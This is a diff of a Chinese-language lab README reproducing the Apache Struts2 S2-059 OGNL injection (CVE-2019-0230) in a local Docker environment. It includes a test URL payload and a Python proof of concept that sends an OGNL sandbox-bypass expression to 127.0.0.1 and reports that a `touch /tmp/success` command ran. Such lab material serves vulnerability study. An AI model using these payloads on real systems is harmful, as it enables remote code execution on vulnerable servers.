@@ -1,39 +1,37 @@
 # Struts2 S2-059 远程代码执行漏洞(CVE-2019-0230)
 
+Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码。
+
 影响版本: Struts 2.0.0 - Struts 2.5.20
 
-## 详细信息
+参考链接：
 
-Apache Struts框架, 会对某些特定的标签的属性值，比如id属性进行二次解析，所以攻击者可以传递将在呈现标签属性时再次解析的OGNL表达式，造成OGNL表达式注入。从而可能造成远程执行代码
+- https://cwiki.apache.org/confluence/display/WW/S2-059
+- https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776
 
-## 参考
-
-https://cwiki.apache.org/confluence/display/WW/S2-059
-
-## 启动
+## 漏洞环境
 
 启动 Struts 2.5.16环境:
 
 ```
 docker-compose up -d
 ```
+
 启动环境之后访问`http://your-ip:8080/?id=1` 就可以看到测试界面
 
-## Exploit
+## 漏洞复现
 
-POC: 
+访问 `http://your-ip:8080/?id=%25%7B233*233%7D`，可以发现233*233的结果被解析到了id属性中：
 
-访问 `http://your-ip:8080/?id=%25%7B233*233%7D`
-可以发现233*233的结果被解析到了id属性中
+![1.png](1.png)
 
-![1.png](./1.png)
+《[OGNL Apache Struts exploit: Weaponizing a sandbox bypass (CVE-2018-11776)](https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776)》给出了绕过struts2.5.16版本的沙盒的poc，利用这个poc可以达到执行系统命令。
 
-[OGNL Apache Struts exploit: Weaponizing a sandbox bypass (CVE-2018-11776)](https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776)给出了绕过struts2.5.16版本的沙盒的poc，利用这个poc可以达到执行系统命令
-
-一个用于验证漏洞的简单python的poc
+通过如下Python脚本复现漏洞：
 
 ```python
 import requests
+
 url = "http://127.0.0.1:8080"
 data1 = {
     "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
@@ -47,9 +45,6 @@ res2 = requests.post(url, data=data2)
 # print(res2.text)
 ```
 
-执行poc之后，`touch /tmp/success` 命令会被执行 
-![2.png](./2.png)
+执行poc之后，进入容器发现`touch /tmp/success`已成功执行。 
 
-
-
-
+![2.png](2.png)
